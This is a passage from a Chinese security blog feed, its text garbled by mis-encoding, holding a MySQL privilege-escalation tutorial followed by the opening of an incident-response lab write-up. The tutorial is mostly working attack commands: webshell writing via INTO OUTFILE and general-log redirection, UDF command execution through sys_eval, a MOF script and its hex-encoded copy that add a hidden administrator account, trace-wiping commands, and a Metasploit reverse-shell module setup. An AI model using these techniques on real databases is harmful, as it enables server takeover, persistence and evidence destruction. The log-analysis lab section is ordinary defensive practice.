        <content type="html"><![CDATA[<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><h1 id="æƒé™è·å–"><a href="#æƒé™è·å–" class="headerlink" title="æƒé™è·å–"></a>æƒé™è·å–</h1><p>è¦ææƒä¹‹å‰é¦–å…ˆå°±è¦æ‹¿åˆ°mysqlçš„æƒé™ï¼Œè¿™é‡Œå¤§ä½¬çš„æ–‡ç« å·²ç»è¯´çš„å¾ˆè¯¦ç»†äº†ï¼Œæˆ‘å°±è®°å½•ä¸€äº›å†™shellç›¸å…³çš„çŸ¥è¯†</p><p><strong>into outfileå†™shell</strong></p><p>éœ€è¦load_file () å¼€å¯ å³ secure_file_priv æ— é™åˆ¶</p><p>å¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤æŸ¥çœ‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br></code></pre></td></tr></table></figure><table><thead><tr><th>Value</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>NULL</td><td>ä¸å…è®¸å¯¼å…¥æˆ–å¯¼å‡º</td></tr><tr><td>&#x2F;tmp</td><td>åªå…è®¸åœ¨ &#x2F;tmp ç›®å½•å¯¼å…¥å¯¼å‡º</td></tr><tr><td>ç©º</td><td>ä¸é™åˆ¶ç›®å½•</td></tr></tbody></table><blockquote><p>åœ¨ MySQL 5.5 ä¹‹å‰ secure_file_priv é»˜è®¤æ˜¯ç©ºï¼Œè¿™ä¸ªæƒ…å†µä¸‹å¯ä»¥å‘ä»»æ„ç»å¯¹è·¯å¾„å†™æ–‡ä»¶</p><p>åœ¨ MySQL 5.5 ä¹‹å secure_file_priv é»˜è®¤æ˜¯ NULLï¼Œè¿™ä¸ªæƒ…å†µä¸‹ä¸å¯ä»¥å†™æ–‡ä»¶</p></blockquote><p><strong>æ—¥å¿—å†™shell</strong></p><p>å¯ä»¥ä¸‹é¢å‘½ä»¤æŸ¥çœ‹æ—¥å¿—ä½ç½®</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br><br>+------------------+---------------------------------+<br>| Variable_name    | Value                           |<br>+------------------+---------------------------------+<br>| general_log      | OFF                             |<br>| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="hljs-built_in">log</span> |<br>+------------------+---------------------------------+<br></code></pre></td></tr></table></figure><p><code>general_log</code> é»˜è®¤å…³é—­ï¼Œå¼€å¯å®ƒå¯ä»¥è®°å½•ç”¨æˆ·è¾“å…¥çš„æ¯æ¡å‘½ä»¤ï¼Œä¼šæŠŠå…¶ä¿å­˜åœ¨å¯¹åº”çš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚</p><p>æˆ‘ä»¬å¯ä»¥è‡ªå·±ä¿®æ”¹æ—¥å¿—æ–‡ä»¶ä½ç½®ï¼Œè¿™æ ·å°±å¯ä»¥å†™shellè¿›å»äº†</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ›´æ”¹æ—¥å¿—æ–‡ä»¶ä½ç½®</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-built_in">set</span> global general_log_file=<span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br></code></pre></td></tr></table></figure><h1 id="udfææƒ"><a href="#udfææƒ" class="headerlink" title="udfææƒ"></a>udfææƒ</h1><p>è‡ªå®šä¹‰å‡½æ•°(user defined function)ï¼Œæ˜¯æ•°æ®åº“åŠŸèƒ½çš„ä¸€ç§æ‰©å±•ã€‚ç”¨æˆ·é€šè¿‡è‡ªå®šä¹‰å‡½æ•°å¯ä»¥å®ç°åœ¨ MySQL ä¸­æ— æ³•æ–¹ä¾¿å®ç°çš„åŠŸèƒ½ï¼Œå…¶æ·»åŠ çš„æ–°å‡½æ•°éƒ½å¯ä»¥åœ¨ SQL è¯­å¥ä¸­è°ƒç”¨ï¼Œå°±åƒè°ƒç”¨æœ¬æœºå‡½æ•° version () ç­‰æ–¹ä¾¿ã€‚</p><h2 id="æ‰‹å·¥å¤ç°"><a href="#æ‰‹å·¥å¤ç°" class="headerlink" title="æ‰‹å·¥å¤ç°"></a>æ‰‹å·¥å¤ç°</h2><p><strong>åŠ¨æ€é“¾æ¥åº“</strong></p><p>è‡ªå®šä¹‰å‡½æ•°æ˜¯æ˜¯ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“çš„å½¢å¼å®ç°çš„ï¼Œå¦‚æœæ˜¯ MySQL &gt;&#x3D; 5.1 çš„ç‰ˆæœ¬ï¼Œå¿…é¡»æŠŠ UDF çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æ”¾ç½®äº MySQL å®‰è£…ç›®å½•ä¸‹çš„ lib\plugin æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶å¤¹ä¸‹æ‰èƒ½åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ã€‚</p><p>åŠ¨æ€é“¾æ¥åº“çš„æ–‡ä»¶å¯ä»¥å»sqlmapå’Œmetasploitå·¥å…·é‡Œé¢å»æ‰¾</p><p><strong>sqlmapçš„udfæ–‡ä»¶ä½ç½®</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sqlmapæ ¹ç›®å½•/data/udf/mysql<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441364.png" alt="image-20240712174152824"></p><p>é‡Œé¢æœ‰windowså’ŒLinuxçš„32ä½å’Œ64ä½çš„åŠ¨æ€é“¾æ¥åº“</p><p>ä¸è¿‡sqlmapé‡Œçš„åŠ¨æ€é“¾æ¥åº“ä¸ºäº†é˜²æ­¢è¯¯æ€ç»è¿‡ç¼–ç å¤„ç†ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œä¸è¿‡å¯ä»¥åˆ©ç”¨sqlmapè‡ªå¸¦çš„è§£ç å·¥å…·æ¥è¿›è¡Œè§£ç ä½¿ç”¨ï¼Œå·¥å…·åœ¨&#x2F;extra&#x2F;cloak&#x2F;cloak.py</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è§£ç  32 ä½çš„ Linux åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># è§£ç  64 ä½çš„ Linux åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># è§£ç  32 ä½çš„ Windows åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># è§£ç  64 ä½çš„ Windows åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p><strong>Metasploitçš„udfæ–‡ä»¶ä½ç½®</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">MSFæ ¹ç›®å½•/data/exploits/mysql<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441365.png" alt="image-20240713012640874"></p><p>msfè‡ªå¸¦çš„åŠ¨æ€é“¾æ¥åº“ä¸éœ€è¦è§£ç å¯ä»¥ç›´æ¥ä½¿ç”¨</p><blockquote><p>kalié‡Œé¢msfçš„æ ¹ç›®å½•åœ¨&#x2F;usr&#x2F;share&#x2F;metasploit-framework</p></blockquote><p><strong>ä¸‹ä¸€æ­¥å°±æ˜¯å°†é“¾æ¥åº“æ”¾åˆ°æ’ä»¶ç›®å½•ä¸‹</strong></p><p>å¯ä»¥ç”¨ä¸‹é¢å‘½ä»¤æŸ¥æ‰¾æ’ä»¶ç›®å½•</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show variables like <span class="hljs-string">&quot;%plugin%&quot;</span><br><span class="hljs-comment">#è¿™æ ·ä¹Ÿè¡Œ</span><br><span class="hljs-keyword">select</span> @@plugin_dir;<br></code></pre></td></tr></table></figure><p>å¦‚æœä¸å­˜åœ¨çš„è¯å¯ä»¥æ‰¾åˆ° MySQL çš„å®‰è£…ç›®å½•ç„¶åæ‰‹å·¥åˆ›å»º <code>\lib\plugin</code> æ–‡ä»¶å¤¹</p><p>æ‰¾mysqlçš„å®‰è£…ç›®å½•å¯ä»¥ç”¨è¿™ä¸ªå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> @@basedir;<br></code></pre></td></tr></table></figure><p><strong>å†™å…¥åŠ¨æ€é“¾æ¥åº“</strong></p><p>sqlæ³¨å…¥æ˜¯postæ³¨å…¥å¯ä»¥ç›´æ¥å†™ï¼Œå› ä¸ºgetæœ‰é•¿åº¦é™åˆ¶ï¼Œè¿™é‡Œå¯ä»¥ç”¨sqlmapæ¥å†™</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sqlmap -u &lt;urlåœ°å€&gt; --data=<span class="hljs-string">&quot;id=1&quot;</span> --file-write=<span class="hljs-string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥æ‰‹å·¥ç”¨sqlè¯­å¥å†™è¿›å»ï¼Œè¿™äº›å‰æéƒ½æ˜¯æœ‰å†™æƒé™</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç›´æ¥ SELECT æŸ¥è¯¢åå…­è¿›åˆ¶å†™å…¥</span><br>SELECT 0x7f454c4602... INTO OUTFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶çš„è·å–å¯ä»¥ç›´æ¥æœ¬åœ°ç”¨mysqlçš„hexå‡½æ•°ç¼–ç ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç›´æ¥ä¼ å…¥è·¯å¾„ç¼–ç </span><br>SELECT hex(load_file(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));<br><br><span class="hljs-comment"># ä¹Ÿå¯ä»¥å°†è·¯å¾„ hex ç¼–ç </span><br>SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));<br></code></pre></td></tr></table></figure><p><strong>ç„¶åå°±æ˜¯åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br>#æŸ¥çœ‹æ˜¯å¦æ–°å¢äº†sys_eval<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br>#ç„¶åå°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>#åˆ é™¤è‡ªå®šä¹‰å‡½æ•°<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;<br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœæƒ³çœ‹soæ–‡ä»¶é‡Œé¢æœ‰å“ªäº›å‡½æ•°ï¼Œå¯ä»¥æ‹–è¿›idaé‡Œé¢çœ‹ä¸€çœ‹</p></blockquote><h1 id="mofææƒ"><a href="#mofææƒ" class="headerlink" title="mofææƒ"></a>mofææƒ</h1><p>è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒè€çš„æ¼æ´äº†ï¼ŒåŸºæœ¬ä¸Šåœ¨ Windows Server 2003 çš„ç¯å¢ƒä¸‹æ‰å¯ä»¥æˆåŠŸã€‚</p><p>ææƒçš„åŸç†æ˜¯ C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; ç›®å½•ä¸‹çš„ mof æ–‡ä»¶æ¯ éš”ä¸€æ®µæ—¶é—´ï¼ˆå‡ ç§’é’Ÿå·¦å³ï¼‰éƒ½ä¼šè¢«ç³»ç»Ÿæ‰§è¡Œï¼Œå› ä¸ºè¿™ä¸ª MOF é‡Œé¢æœ‰ä¸€éƒ¨åˆ†æ˜¯ VBS è„šæœ¬ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ª VBS è„šæœ¬æ¥è°ƒç”¨ CMD æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœ MySQL æœ‰æƒé™æ“ä½œ mof ç›®å½•çš„è¯ï¼Œå°±å¯ä»¥æ¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ã€‚</p><p><strong>mofè„šæœ¬çš„å†…å®¹</strong></p><figure class="highlight vbscript"><table><tr><td class="code"><pre><code class="hljs vbscript">#pragma name<span class="hljs-built_in">space</span>(<span class="hljs-string">&quot;\\\\.\\root\\subscription&quot;</span>) <br><br>instance of __EventFilter as $EventFilter <br>&#123; <br>    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>; <br>    Name  = <span class="hljs-string">&quot;filtP2&quot;</span>; <br>    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span> <br>            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span> <br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>; <br>    QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>; <br>&#125;; <br><br>instance of ActiveScriptEventConsumer as $Consumer <br>&#123; <br>    Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>; <br>    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>; <br>    ScriptText = <br><span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user hacker P@ssw0rd /add\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe localgroup administrators hacker /add\<span class="hljs-string">&quot;)&quot;</span>; <br>&#125;; <br><br>instance of __FilterToConsumerBinding <br>&#123; <br>    Consumer   = $Consumer; <br>    Filter = $EventFilter; <br>&#125;;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒpayload</p><figure class="highlight vbscript"><table><tr><td class="code"><pre><code class="hljs vbscript">var WSH = <span class="hljs-keyword">new</span> ActiveXObject(\<span class="hljs-string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="hljs-string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="hljs-string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)<br>#è¿™ä¸¤æ®µæŒ‡ä»¤åˆ†åˆ«æ˜¯ä½¿ç”¨net.exeå·¥å…·æ·»åŠ ä¸€ä¸ªåä¸º<span class="hljs-string">&quot;hacker&quot;</span>çš„æ–°ç”¨æˆ·ï¼Œå¯†ç è®¾ç½®ä¸º<span class="hljs-string">&quot;P@ssw0rd&quot;</span>ã€‚/addå‚æ•°è¡¨ç¤ºæ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·<br>#å°†ç”¨æˆ·<span class="hljs-string">&quot;hacker&quot;</span>æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆlocalgroup administratorsï¼‰ã€‚è¿™æ„å‘³ç€<span class="hljs-string">&quot;hacker&quot;</span>ç”¨æˆ·å°†æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ã€‚<br></code></pre></td></tr></table></figure><p>ä¾ç„¶å¯ä»¥ç”¨ä¸Šé¢çš„æ–¹æ³•æŠŠæ–‡ä»¶å˜æˆåå…­è¿›åˆ¶å†™å…¥</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span> <span class="hljs-keyword">into</span> dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;<br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸçš„çš„æ—¶å€™ï¼Œtest.mof ä¼šå‡ºç°åœ¨ï¼šc:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;good&#x2F; ç›®å½•ä¸‹ å¦åˆ™å‡ºç°åœ¨ c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;bad ç›®å½•ä¸‹</p><p><strong>ç—•è¿¹æ¸…ç†</strong></p><p>å› ä¸ºæ¯éš”å‡ åˆ†é’Ÿæ—¶é—´åˆä¼šé‡æ–°æ‰§è¡Œæ·»åŠ ç”¨æˆ·çš„å‘½ä»¤ï¼Œæ‰€ä»¥æƒ³è¦æ¸…ç†ç—•è¿¹å¾—å…ˆæš‚æ—¶å…³é—­ winmgmt æœåŠ¡å†åˆ é™¤ç›¸å…³ mof æ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™å†åˆ é™¤ç”¨æˆ·æ‰ä¼šæœ‰æ•ˆæœ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åœæ­¢ winmgmt æœåŠ¡</span><br>net stop winmgmt<br><br><span class="hljs-comment"># åˆ é™¤ Repository æ–‡ä»¶å¤¹</span><br><span class="hljs-built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\<br><br><span class="hljs-comment"># æ‰‹åŠ¨åˆ é™¤ mof æ–‡ä»¶</span><br>del C:\Windows\system32\wbem\mof\good\test.mof /F /S<br><br><span class="hljs-comment"># åˆ é™¤åˆ›å»ºçš„ç”¨æˆ·</span><br>net user hacker /delete<br><br><span class="hljs-comment"># é‡æ–°å¯åŠ¨æœåŠ¡</span><br>net start winmgmt<br></code></pre></td></tr></table></figure><p><strong>msfææƒ</strong></p><p>msfé‡Œé¢å°±æœ‰mofææƒçš„æ¨¡å—ï¼Œè¿˜ä¼šè‡ªåŠ¨æ¸…ç†ç—•è¿¹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/windows/mysql/mysql_mof<br><span class="hljs-comment"># è®¾ç½®å¥½è‡ªå·±çš„ payload</span><br>msf6 &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><br><span class="hljs-comment"># è®¾ç½®ç›®æ ‡ MySQL çš„åŸºç¡€ä¿¡æ¯</span><br>msf6 &gt; <span class="hljs-built_in">set</span> rhosts 10.211.55.21<br>msf6 &gt; <span class="hljs-built_in">set</span> username root<br>msf6 &gt; <span class="hljs-built_in">set</span> password root<br>msf6 &gt; run<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ææƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç„æœºåº”æ€¥å“åº”é¶åœº-ç¬¬äºŒç« </title>
      <link href="/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
      <url>/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="apacheæ—¥å¿—åˆ†æ"><a href="#Apacheæ—¥å¿—åˆ†æ" class="headerlink" title="Apacheæ—¥å¿—åˆ†æ"></a>Apacheæ—¥å¿—åˆ†æ</h1><p>é¶åœºç®€ä»‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">è´¦å·å¯†ç  root apacherizhi<br>ssh root@IP<br>1ã€æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š<br>2ã€é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š<br>3ã€æŸ¥çœ‹index.phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š<br>4ã€æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼š<br>5ã€æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°:<br></code></pre></td></tr></table></figure><p>apacheçš„æ—¥å¿—æ”¾åœ¨&#x2F;var&#x2F;log&#x2F;apacheç›®å½•ä¸‹é¢</p><p><img src="http://cdn.clown2024.cn/202407151644888.png" alt="image-20240710153749475"></p><p>ç„¶åç”¨ä¸‹é¢æŒ‡ä»¤ç­›é€‰å‡ºè®¿é—®çš„ipæ¬¡æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cut</span> -d- -f 1 access.log.1|<span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn | <span class="hljs-built_in">head</span> -20 <br><span class="hljs-comment">#----------</span><br><span class="hljs-built_in">cut</span>å‘½ä»¤ç”¨äºå‰ªåˆ‡å¹¶åˆ†å‰²æ–‡ä»¶ä¸­çš„è¡Œã€‚<br>-d-æŒ‡å®šåˆ†éš”ç¬¦ä¸º<span class="hljs-string">&quot;-&quot;</span>ï¼Œå³ä»¥è¿å­—ç¬¦ä½œä¸ºå­—æ®µçš„åˆ†éš”ç¬¦ã€‚<br>-f 1æŒ‡å®šåªæå–æ¯ä¸ªå­—æ®µçš„ç¬¬ä¸€ä¸ªéƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯è¡Œçš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚<br><br><span class="hljs-built_in">sort</span>å‘½ä»¤ç”¨äºå¯¹æ–‡æœ¬è¡Œè¿›è¡Œæ’åºã€‚<br>-ré€‰é¡¹è¡¨ç¤ºä»¥é€†åºï¼ˆä»å¤§åˆ°å°ï¼‰æ’åºã€‚<br>-né€‰é¡¹è¡¨ç¤ºæŒ‰ç…§æ•°å€¼å¤§å°è¿›è¡Œæ’åºã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644889.png" alt="image-20240710155027635"></p><p>flag{192.168.200.2}</p><p>æµè§ˆå™¨æŒ‡çº¹å°±è¿‡æ»¤ä¸€ä¸‹çœ‹çœ‹å…·ä½“çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep 192.168.200.2<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644890.png" alt="image-20240710155145579"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//æµè§ˆå™¨æŒ‡çº¹<br>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<br><br>flag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;<br></code></pre></td></tr></table></figure><p> æ‰¾index.phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;/index.php&quot;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment"># wc -lå‘½ä»¤ç”¨äºè®¡ç®—åŒ¹é…åˆ°çš„è¡Œæ•°ï¼Œflag&#123;27&#125;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644891.png" alt="image-20240711125509920"></p><p>æŸ¥æ‰¾é»‘å®¢ipè®¿é—®çš„æ¬¡æ•°ï¼Œæˆ‘ä»¬åªè¦æŠŠå»æ‰é‡å¤è¡Œæ”¹æˆè®¡ç®—åŒ¹é…è¡Œæ•°å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;192.168.200.2 - -&quot;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment">#flag&#123;6555&#125;</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼ŒæŠŠç¬¬ä¸€ä¸ªæŸ¥çœ‹è®¿é—®ipæ”¹æˆæ—¶é—´å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;03/Aug/2023:08:&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> -nr| <span class="hljs-built_in">uniq</span> -c<br><span class="hljs-comment"># æˆ‘ä»¬è¦ç”¨ipæ¥åŒ¹é…æ‰èƒ½æ­£ç¡®å»æ‰é‡å¤è¡Œï¼Œæ‰€ä»¥è¦å…ˆawkæ‰“å°ç¬¬ä¸€ä¸ªå­—æ®µä¹Ÿå°±æ˜¯ip</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644892.png" alt="image-20240711130832864"></p><p>flag{5}</p><h1 id="mysqlåº”æ€¥å“åº”"><a href="#mysqlåº”æ€¥å“åº”" class="headerlink" title="mysqlåº”æ€¥å“åº”"></a>mysqlåº”æ€¥å“åº”</h1><p>é¶æœºç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mysqlåº”æ€¥å“åº” sshè´¦å· root  å¯†ç  xjmysql<br>ssh env.xj.edisec.net  -p xxxxx<br>1.é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell flag&#123;å…³é”®å­—ç¬¦ä¸²&#125; <br>2.é»‘å®¢åå¼¹shellçš„ip flag&#123;ip&#125;<br>3.é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ md5 flag&#123;md5&#125; æ³¨ /xxx/xxx/xxx/xxx/xxx.xx<br>4.é»‘å®¢è·å–çš„æƒé™ flag&#123;whoamiåçš„å€¼&#125;<br></code></pre></td></tr></table></figure><p>å…ˆå»çœ‹ä¸€ä¸‹mysqlçš„æ—¥å¿—ï¼Œåœ¨&#x2F;var&#x2F;log&#x2F;mysqlä¸‹é¢</p><p><img src="http://cdn.clown2024.cn/202407151644893.png" alt="image-20240711182807349"></p><p><img src="http://cdn.clown2024.cn/202407151644894.png" alt="image-20240711182925627"></p><p>çœ‹çœ‹webç›®å½•ä¸‹æœ‰æ²¡æœ‰è¢«å†™shellï¼Œæ¯•ç«Ÿä¸€èˆ¬éƒ½æ˜¯ä»ç½‘ç«™å¼€å§‹æ¸—é€çš„</p><p><img src="http://cdn.clown2024.cn/202407151644895.png" 